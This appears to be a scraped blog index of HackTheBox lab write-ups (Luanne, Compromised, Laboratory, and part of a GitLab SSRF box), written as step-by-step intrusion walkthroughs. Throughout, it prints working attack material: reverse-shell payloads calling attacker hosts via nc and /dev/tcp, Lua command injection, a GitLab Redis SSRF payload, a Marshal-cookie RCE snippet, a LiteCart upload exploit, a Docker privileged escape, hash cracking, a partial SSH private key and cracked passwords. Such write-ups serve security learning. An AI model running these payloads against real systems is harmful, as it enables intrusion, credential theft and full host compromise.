url-encode-decode.com❯ python payload-gen.py #Scripting left on payload generating becaouse for some reason gitlab returning 422 error on every request outside chromium browser.IP: 10.10.15.71Port: 4141git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A+multi%0D%0A+sadd+resque%3Agitlab%3Aqueues+system_hook_push%0D%0A+lpush+resque%3Agitlab%3Aqueue%3Asystem_hook_push+%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7Cnc+-e+%2Fbin%2Fbash+10.10.15.71+4141%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A+exec%0D%0A+exec%0D%0A%2Fssrf.gitIntercept “project import” request replace import url with paylad.Privesc Inside docker container [*] ctn000 Are we in a docker container?................................... yes!---... [snip] ...-rwxr-xr-x 1 root root 0 Dec 1 12:41 /.dockerenv Container’s root password floting in / root directory but password is not working.Found gitlab config file backup in /opt/backup/ directory and password.and password work for container rootNow running deepce.sh script found Privileged Mode enable.[+] Privileged Mode ......... Yesdocker container with privileged Escaping Docker Privileged Containers by Vickie Li hacktricks.xyz techniqueRoot-0x1Exploit docker Privileged Mode with deepce script./deepce.sh --no-enumeration --exploit PRIVILEGED -cmd &#39;hostname&#39; -qRoot-0x2The --privileged (Privileged Mode) flag allows the container to have access to the host devices. So container root user can mount host.Privileged Mode allow continer root to run fdisk on host.(remote) root@gitlab.example.com:/tmp$ fdisk -l... [snip] ...Device Start End Sectors Size Type/dev/sda1 2048 4095 2048 1M BIOS boot/dev/sda2 4096 37746687 37742592 18G Linux filesystem/dev/sda3 37746688 41940991 4194304 2G Linux swapHost is in /dev/sda2mounting host in the comtainermkdir /tmp/hostmount /dev/sda2 /tmp/hostwc -c /tmp/host/root/root.txtfinally root shell with deepce script" }, { "title": "Hackthebox - Luanne", "url": "/posts/luanne/", "categories": "hackthebox, linux", "tags": "command injection, Unix-to-Unix encode, doas", "date": "2020-11-28 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.218 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.218PORT STATE SERVICE REASON VERSION+ 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)+ 80/tcp open http syn-ack ttl 63 nginx 1.19.0| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=.| http-methods: |_ Supported Methods: GET HEAD POST| http-robots.txt: 1 disallowed entry |_/weather|_http-server-header: nginx/1.19.0|_http-title: 401 Unauthorized+ 9001/tcp open http syn-ack ttl 63 Medusa httpd 1.12 (Supervisor process manager)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=default|_http-server-header: Medusa/1.12|_http-title: Error responseService Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd From port 80 nmap found a robots.txt file and inside that file there is a disallowed directory path /weather Port 80 http://10.10.10.218 through a login prompt Port 9001 http://10.10.10.218 through a login promptWeb_server - Port 80 gobuster inside /weather directory - gobuster dir -u http://10.10.10.218/weather/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 40 /forecast (Status: 200) Goto http://10.10.10.218/weather/forecast through an error - {&quot;code&quot;: 200, &quot;message&quot;: &quot;No city specified. Use &#39;city=list&#39; to list available cities.&quot;} specifying city=list in the url and Goto http://10.10.10.218/weather/forecast?city=list give the list of cities - {&quot;code&quot;: 200,&quot;cities&quot;: [&quot;London&quot;,&quot;Manchester&quot;,&quot;Birmingham&quot;,&quot;Leeds&quot;,&quot;Glasgow&quot;,&quot;Southampton&quot;,&quot;Liverpool&quot;,&quot;Newcastle&quot;,&quot;Nottingham&quot;,&quot;Sheffield&quot;,&quot;Bristol&quot;,&quot;Belfast&quot;,&quot;Leicester&quot;]} specifying the city name from the list city=London in the url http://10.10.10.218/weather/forecast?city=London give the weather report of the city and the report is same for every city. adding single quote &#39; in the end http://10.10.10.218/weather/forecast?city=&#39; through an error &amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value Error specified that the backend is running lua language. try different lua syntax and finely execute lua syntax -Request: http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--Response: {&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: pwn breakdown the payload - payload is url encoded formate original lua syntax to fil the nill value &#39;);&amp;lt;lua_syntax&amp;gt;-- there is a os.execute function in the lua that execute shell command from lua syntax. create a code execution payload with lua runtime - Payload: &#39;);os.execute(&quot;id&quot;)-- URL-Enode: %27%29%3Bos.execute%28%22id%22%29-- Request: http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29-- Response: &quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd) and this verified the command execution vulnerability.User ExploitUSER:_httpd shellReverse shell: Payload: &#39;);os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc tun0 4141 &amp;gt;/tmp/f&quot;)--URL-Enode: %27%29%3Bos.execute%28%22rm%2520+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+tun0+4141+%3E%2Ftmp%2Ff%22%29--Request: http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20tun0%204141%20%3E%2Ftmp%2Ff%22%29--Response: nc -nvlp 4141 listening on [any] 4141 ...+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.218] 65376 sh: can&#39;t access tty; job control turned off+$ id+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)User Escalation inside the /var/www dir there is a .htpasswd file which contains a user and password hash - $ cd /var/www$ ls -la+-rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd -rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html -rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt$ cat .htpasswd+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0 Hash: webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0john❯ echo &#39;webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&#39; &amp;gt; hash❯ john hash -w=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 8 OpenMP threads+iamthebest (webapi_user)Session completedcredswebapi_user:iamthebestEnumeration login to port 80 worked but nothing interesting there, and login to port 9001 not working. home directory have a r.michaels user directory and r.michaels is a user - r.michaels:*:1000:100::/home/r.michaels:/bin/ksh su to user r.michaels is not working $ su - r.michaelsInappropriate ioctl for devicesu: Sorry: Conversation failure and doas utility is also not available for _httpd user - $ doas -u r.michaels /bin/kshdoas: Operation not permitted checking network ports $ netstat -ant | grep LISTENtcp 0 0 127.0.0.1.3000 *.* LISTENtcp 0 0 127.0.0.1.3001 *.* LISTEN I already seen the port 3000 in port 80 login error and 3000 is the local instance of the port 80. port 3001 is new curl on port 3001 $ curl 127.0.0.1:3001% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 199 100 199 0 0 99500 0 --:--:-- --:--:-- --:--:-- 99500&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;401 Unauthorized&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;401 Unauthorized&amp;lt;/h1&amp;gt;/: &amp;lt;pre&amp;gt;No authorization&amp;lt;/pre&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;address&amp;gt;&amp;lt;a href=&quot;//127.0.0.1:3001/&quot;&amp;gt;127.0.0.1:3001&amp;lt;/a&amp;gt;&amp;lt;/address&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; asking for authorization. using same creds to login - $ curl --user webapi_user:iamthebest http://127.0.0.1:3001% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 386 100 386 0 0 125k 0 --:--:-- --:--:-- --:--:-- 125k&amp;lt;!doctype html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Index&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;p&amp;gt;&amp;lt;h3&amp;gt;Weather Forecast API&amp;lt;/h3&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;h4&amp;gt;List available cities:&amp;lt;/h4&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;a href=&quot;/weather/forecast?city=list&quot;&amp;gt;/weather/forecast?city=list&amp;lt;/a&amp;gt; &amp;lt;p&amp;gt;&amp;lt;h4&amp;gt;Five day forecast (London)&amp;lt;/h4&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;a href=&quot;/weather/forecast?city=London&quot;&amp;gt;/weather/forecast?city=London&amp;lt;/a&amp;gt; &amp;lt;hr&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; same page that get from the port 80 login. tested the code execution vulnerability here on port 3001 and it looks line local server is not vulnerable for command execution - $ curl --user webapi_user:iamthebest &quot;http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--&quot;% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 60 0 60 0 0 30000 0 --:--:-- --:--:-- --:--:-- 30000{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: &#39;);os.execute(&quot;id&quot;)--&quot;} Running server is nginx and like apache2 mod_userdir nginx also have this option. this allow user to create a shared dir in the home/&amp;lt;user&amp;gt; folder can be accessible form server with using ~ in prefix. and the server on port 3001 is run by the user r.michaels ps -aux | grep 185 r.michaels 185 0.0 0.0 34996 2004 ? Is 6:18AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www and when testing for shared folder i found the user r.michaels ssh key’s copy in the shared folder - $ curl --user webapi_user:iamthebest &quot;http://127.0.0.1:3001/~r.michaels/&quot; USER:r.michaels shellcurl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 2610 100 2610 0 0 849k 0 --:--:-- --:--:-- --:--:-- 1274k-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn...45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG-----END OPENSSH PRIVATE KEY-----sshssh -i michaels-id_rsa r.michaels@10.10.10.218NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020Welcome to NetBSD!luanne$ iduid=1000(r.michaels) gid=100(users) groups=100(users)luanne$ cat user.txtea5f0ce6************************Enumeration inside the /home/r.michaels/backups folder there is a file named devel_backup-2020-09-16.tar.gz - luanne$ pwd/home/r.michaels/backupsluanne$ ls -latotal 12dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 .dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 ..-r-------- 1 r.michaels users 1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc enc file extention: The .enc file extension is used by files in the UUencoded format, which are encrypted files.UUenconded format: Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.Tool: in openbsd there is tool called netpgp that can be use to encrypt or decrypt. decrypt .enc file luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz signature 2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a uid RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;luanne$ ls -la /tmp-rw------- 1 r.michaels wheel 1639 Nov 29 09:07 devel_backup-2020-09-16.tar.gz file delete after a minute so i copied it locally -```diff❯ scp -i id_rsa r.michaels@10.10.10.218:/tmp/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gzdevel_backup-2020-09-16.tar.gz 100% 1639 2.6KB/s 00:00❯ tar -xf devel_backup-2020-09-16.tar.gz❯ cd devel-2020-09-16❯ ls -ladrwxr-xr-x 2 x00tex x00tex 4096 Sep 16 20:42 webapidrwxr-xr-x 2 x00tex x00tex 4096 Nov 29 20:06 www❯ cd www❯ ls -la–rw-r–r– 1 x00tex x00tex 47 Sep 16 23:44 .htpasswd -rw-r–r– 1 x00tex x00tex 378 Sep 16 20:33 index.html❯ cat .htpasswd+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.* inside the tar archive there is a server backup data and also the `.htpasswd` file with same username but this time the hash is diffrent.#### john```diff❯ echo &#39;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.&#39; &amp;gt;&amp;gt; hash❯ john hash -w=/usr/share/wordlists/rockyou.txtLoaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Remaining 1 password hash+littlebear (webapi_user)Session completed❯ john hash --showwebapi_user:iamthebest+webapi_user:littlebear2 password hashes cracked, 0 left we get a new password. try su to root but this time user r.michaels don’t have su rights. luanne$ su - root su: You are not listed in the correct secondary group (wheel) to su root. su: Sorry: Authentication error try doas and this time it worked.Root escalation+luanne$ doas -u root /bin/sh+Password: littlebear# id+uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)# cd /root# cat root.txt7a9b5c20************************" }, { "title": "Hackthebox - Compromised", "url": "/posts/compromised/", "categories": "hackthebox, linux", "tags": "litecart 2.1.2, cve-2018-12256, php 7.3, binary reversing", "date": "2020-11-27 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.207 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.207PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Legitimate Rubber Ducks | Online Store|_Requested resource was http://10.10.10.207/shop/en/Web_serverwebserver is running LiteCart CMS - A free online catalog and shopping cart platform developed in PHP.Gobustergobuster dir -u http://10.10.10.207/ -w /usr/share/wordlists/dirb/common.txt -t 40/backup (Status: 301) found a backup dir/backupGoto http://10.10.10.207/backupIndex of /backupName Last modified Size DescriptionParent Directory - a.tar.gz 2020-09-03 11:51 4.4M Found a tar archive this file contains the backup of the webserver. after some time enumerating the backup i found some interesting data. in the includes/config.inc.php [file] found a password hash and database configuration - // Database define(&#39;DB_TYPE&#39;, &#39;mysql&#39;); define(&#39;DB_SERVER&#39;, &#39;localhost&#39;); define(&#39;DB_USERNAME&#39;, &#39;root&#39;); define(&#39;DB_PASSWORD&#39;, &#39;changethis&#39;); define(&#39;DB_DATABASE&#39;, &#39;ecom&#39;); define(&#39;DB_TABLE_PREFIX&#39;, &#39;lc_&#39;); define(&#39;DB_CONNECTION_CHARSET&#39;, &#39;utf8&#39;); define(&#39;DB_PERSISTENT_CONNECTIONS&#39;, &#39;false&#39;); // Password Encryption Salt define(&#39;PASSWORD_SALT&#39;, &#39;kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI&#39;); Found mysql database creds: root:changethis but this database is in the local so these creds are not useful and the password hash is salted so cracking this hash is wast of time so i move forward. found a comment inside admin/login.php file - //file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#39;username&#39;] . &quot; Passwd: &quot; . $_POST[&#39;password&#39;]); this comment indicate a file directory /.log2301c9430d8593ae.txt in the server where login creds a stored. i an asuming the login.php file is in shop/admin directory so that the txt file is also there. and going to http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt i got some creds User: admin Passwd: theNextGenSt0r3!~ credsadmin:theNextGenSt0r3!~admin loginGoto http://10.10.10.207/shop/admin redirect to admin login page http://10.10.10.207/shop/admin/login.php?redirect_url=%2Fshop%2Fadmin%2F in the admin panel i got running LiteCart version 2.1.2LiteCart Arbitrary File Upload (Authenticated) Exploit searching on google for LiteCart-2.1.2-Exploit i found a CVE Vulnerability Details : CVE-2018-12256 Description: admin/vqmods.app/vqmods.inc.php in LiteCart before 2.1.3 allows remote authenticated attackers to upload a malicious file (resulting in remote code execution) by using the text/xml or application/xml Content-Type in a public_html/admin/?app=vqmods&amp;amp;doc=vqmods request. shop/admin/vqmods.app/vqmods.inc.php file is responsible for this vulnerability. Exploit surface On the admin panel goto vQmods tab http://10.10.10.207/shop/admin/?app=vqmods&amp;amp;doc=vqmods here we can see a file upload option. from the file upload option we can upload a php file instead of xml file by changing Content-Type: application/x-php to Content-Type: application/xml in the POST request and we can see that the file get uploaded, and thats the way we can get the remote code execution.Why this happening -in the litecart version 2.1.2 it validates the vQmods xml file by checking Content-Type in the file upload POST request and the Content-Type is determined by the file extension so when we upload xml file then the Content-Type: text/xml and when we upload php file then the Content-Type: application/x-phpand in the litecart 2.1.2 source code of the vqmods.inc.php file:upload function is only validates the file by checking the Content-Type from the POST request.so if we intercept the POST request and change the Content-Type: application/x-php to Content-Type: application/xml while uploading php file it get uploaded easily.User Exploit found python script in ExploitDB but this script did not worked. first i do a manual test and execute the phpinfo() function to check the server’s php configuration and found out that in the server there are so many php functions are disabled and thats why the ExploitDB script was not worked. I also find php version is 7.2.24-0ubuntu0.18.04.6 there is a disable functions bypass vulnerability in the php version 7.0&amp;lt;7.3 and i can use that to bypass the disabled function and can execute shell commands but don’t get shell. PHP 7.0 &amp;lt; 7.3 (Unix) - ‘gc’ disable_functions Bypass - ExploitDB I just need to upload that disable_functions bypass exploit php file and change the pwn function input in line 17 pwn(&quot;uname -a&quot;); to a shell commands i want to execute and get output in the browser from http://10.10.10.207/shop/vqmod/xml/bypass.php in the pwn function from exploit.php file i use $_REQUEST superglobal variablesuper global variable $_REQUEST is used to collect the user input so we can use this variable to run commands from url field without uploading php file every timesolving all scripts errors -First, change bypass.php pwn function input from shell command -pwn(&quot;uname -a&quot;);to a global variable -pwn($_REQUEST[&#39;c&#39;]);Second, to solve ExploitDB’s litecart exploit script we need to remove php shell from it -and load bypass.php file in it -USER:www-data shellRun litecart exploit scriptpython litecart-exploitdb.py -t http://10.10.10.207/shop/admin/ -p &#39;theNextGenSt0r3!~&#39; -u adminShell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/F8ALL.php?c=iduid=33(www-data) gid=33(www-data) groups=33(www-data)compromisedwww-dataFrom url shellhttp://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=cat%20/etc/passwdroot:x:0:0:root:/root:/bin/bash...sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bashmysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash so there is a user mysql with /bin/bash that means sql database has a user level rights. from tar archive i already found creds for mysql database so i can login into. i found a User Defined Functions(udf) in mysql - http://10.10.10.207/shop/vqmod/xml/MF6GJ.php?c=mysql -u root -pchangethis -e &quot;select * from mysql.func&quot; name ret dl typeexec_cmd 0 libmysql.so function so i can use this function exec_cmd to execute system commands - http://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=mysql -u root -pchangethis -e &quot;select exec_cmd(&#39;id&#39;)&quot; exec_cmd(&#39;id&#39;) uid=111(mysql) gid=113(mysql) groups=113(mysql)\\n\\0\\0\\0\\0\\0\\0\\0\\0\\...\\0\\0\\0\\0 get a shell command output but when i try to execute reverse shell it did not worked for me so i put public ssh key in the user’s Authorized keys and get a ssh shell as user mysql verifying authorized_keys file location http://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=mysql -u root -pchangethis -e &quot;select exec_cmd(&#39;pwd&#39;)&quot; exec_cmd(&#39;pwd&#39;) /var/lib/mysql\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\...\\0\\0\\0\\0 http://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=mysql -u root -pchangethis -e &quot;select exec_cmd(&#39;cd .ssh;ls&#39;)&quot; exec_cmd(&#39;cd .ssh;ls&#39;) authorized_keys\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\...\\0\\0\\0\\0 Put ssh key http://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=mysql -u root -pchangethis -e &quot;select exec_cmd(&#39;echo ssh-rsa AAAAB3NzaC1y...Nb5q4%2B1LtnZpjM= &amp;gt; ~/.ssh/authorized_keys&#39;)&quot; while putting my ssh in the authorized_keys it won’t worked at first and then i notice in the output that the every plus + sign from the ssh key was converted into a white space so i changed every + sign into %2B that is equivalent to a plus sign to solve this problem. USER:mysql shellssh -i mysql mysql@10.10.10.207mysql@compromised:~$ iduid=111(mysql) gid=113(mysql) groups=113(mysql) there is a strace log file in the mysql directory - Strace: strace is a powerful command line tool for debugging and trouble shooting programs in Unix-like operating systems such as Linux. It captures and records all system calls made by a process and the signals received by the process. mysql@compromised:~$ ls -la strace-log.dat-r--r----- 1 root mysql 787180 May 13 2020 strace-log.dat it this log file i found sysadmin user password - mysql@compromised:~$ cat strace-log.dat | grep password22227 03:11:09 execve(&quot;/usr/bin/mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password=3*NLJE32I$Fe&quot;], 0x55bc62467900 /* 21 vars */) = 0 credssysadmin:3*NLJE32I$FeUSER:sysadmin shell su to user sysadmin mysql@compromised:~$ su - sysadminPassword: 3*NLJE32I$Fesysadmin@compromised:~$ cat user.txt6353ccb6************************ Privesc Enumeration while searching for most recently modified files i found a Shared Object pam_unix.so sysadmin@compromised:~$ dpkg -V 2&amp;gt;/dev/null??5?????? /lib/x86_64-linux-gnu/security/pam_unix.sosysadmin@compromised:~$ ls -lt /lib/x86_64-linux-gnu/security/pam_unix.so-rw-r--r-- 1 root root 198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/pam_unix.so this file created/modified(Aug 31) just before the box release(12 September 2020). pam_unix: It uses standard calls from the system’s libraries to retrieve and set account information as well as authentication. Usually this is obtained from the /etc/passwd and the /etc/shadow file as well if shadow is enabled. one interesting thing i found while searching about this file is that this file also used in persistence compromised attack where attacker modified the file and backdoor it with a master password to access root without any interruption and i also found a script for this at zephrax@github Root Privesc Download file in my machine scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so pam_unix.so sysadmin@10.10.10.207&#39;s password: 3*NLJE32I$Fepam_unix.so 100% 194KB 111.2KB/s 00:01 using Ghidra reverse engineering tool to disassemble the library - backdoor._0_8_ = 0x4533557e656b6c7a;backdoor._8_7_ = 0x2d326d3238766e; decoding hardcoded password: convert hex into charsequence in ghidra - 00103195 48 b8 7a MOV RAX,&quot;E3U~eklz&quot;001031a9 48 b8 6e MOV RAX,&quot;\\0-2m28vn&quot; then append both togeather and create a string - -2m28vnE3U~eklz and reverse the string order - &amp;gt;&amp;gt;&amp;gt; &quot;-2m28vnE3U~eklz&quot;[::-1]&#39;zlke~U3Env82m2-&#39; got the password: zlke~U3Env82m2-credsroot:zlke~U3Env82m2- su to root shell sysadmin@compromised:~$ su - rootPassword: zlke~U3Env82m2-root@compromised:~# cat root.txte2bd79c2************************ " }, { "title": "Hackthebox - Laboratory", "url": "/posts/laboratory/", "categories": "hackthebox, linux", "tags": "gitLab 12.8.1, path traversal, binary path hijacking", "date": "2020-11-25 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.216 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.216PORT STATE SERVICE VERSION+ 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)+ 80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to https://laboratory.htb/+ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=laboratory.htb- Subject Alternative Name: DNS:git.laboratory.htb| Not valid before: 2020-07-05T10:39:28|_Not valid after: 2024-03-03T10:39:28 Port_80 redirect to https://laboratory.htb/ there is also a Subject Alternative Name: DNS : git.laboratory.htb add both in /etc/hosts file Nothing in the https://laboratory.htb/ git.laboratory.htb is a GitLab Instance. git.laboratory.htb redirected to https://git.laboratory.htb/users/sign_inGobuster running Gobuster on git - gobuster dir -u https://git.laboratory.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -k --wildcard -s 200 /robots.txt (Status: 200) found robots.txt robots.txt has some Disallow directory there is only one allow dir Allow: /users/sign_in and the only allowed dir is /users/sign_in where https://git.laboratory.htb is redirected. Goto: sign_in page there is a register option to create a gitlab account, create a new account and login.Gitlabrunning version on the server GitLab Community Edition 12.8.1vulnerability : GitLab version &amp;lt;12.9.1 is vulnerable for Arbitrary file read (Path Traversal) to RCE exploit by getting secret_key_base from GitLab Instance using AFR and generate malicious payload cookie to get reverse shellsource of complete exploitation : https://hackerone.com/reports/827052User ExploitExploiting Gitlab Arbitrary file read via the UploadsRewriter when moving and issue Steps to reproduce Create two projects Add an issue with the following description: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml) Move the issue to the second project The file will have been copied to the project secret_key_base : 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 generate malicious payload cookiefor generating malicious payload cookie we need to create local GitLab Instance and change Instance’s secret_key_base with that server’s key in /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file and then run the ruby snippet from the report in a gitlab-rails console to generate cookie. setup GitLab Instance pull and run export GITLAB_HOME=/srv/gitlabsudo docker run --detach \\ --hostname gitlab.x00tex.com \\ --publish 443:443 --publish 80:80 --publish 22:22 \\ --name gitlab \\ --restart always \\ --volume $GITLAB_HOME/config:/etc/gitlab \\ --volume $GITLAB_HOME/logs:/var/log/gitlab \\ --volume $GITLAB_HOME/data:/var/opt/gitlab \\ gitlab/gitlab-ce:12.8.1-ce.0sudo docker exec -it gitlab /bin/bash start run and stop gitlab sudo docker start gitlabsudo docker exec -it gitlab /bin/bashsudo docker stop gitlab Edit /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file and change secret_key_base with box key. open rails console gitlab-rails console generating cookie request = ActionDispatch::Request.new(Rails.application.env_config)request.env[&quot;action_dispatch.cookies_serializer&quot;] = :marshalcookies = request.cookie_jarerb = ERB.new(&quot;&amp;lt;%= `/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/tun0/4141 0&amp;gt;&amp;amp;1&#39;` %&amp;gt;&quot;)depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@Result&quot;, ActiveSupport::Deprecation.new)cookies.signed[:cookie] = deprputs cookies[:cookie] send cookie to the server: curl -k -vvv &#39;https://git.laboratory.htb/users/sign_in/&#39; -b &quot;experimentation_subject_id=&amp;lt;COOKIE&amp;gt;&quot; User esclate user git home is /var/opt/gitlab and there is a backups folder - (remote) git@git.laboratory.htb:/$ cd(remote) git@git.laboratory.htb:/var/opt/gitlab$ ls -latotal 96drwxr-xr-x 20 root root 4096 Dec 3 06:17 .drwxr-xr-x 1 root root 4096 Feb 24 2020 ..+drwx------ 4 git root 4096 Dec 3 11:00 backups in gitlab there is a gitlab-backup util -```(remote) git@git.laboratory.htb:/var/opt/gitlab$ gitlab-backup –helpUsage: gitlab-backup COMMAND [OPTIONS]OPTIONS:-h, –help Display this help message and exits. Use COMMAND --help for more information on a command.COMMANDS: create Creates a new backup. restore Restores from a backup.* if we run `gitlab-backup` in the terminal it backups complete gitlab instance and save in the backups folder and as a i am a user git i can run that command and then i can see that dexter repo that i seen in the gitlab.* running 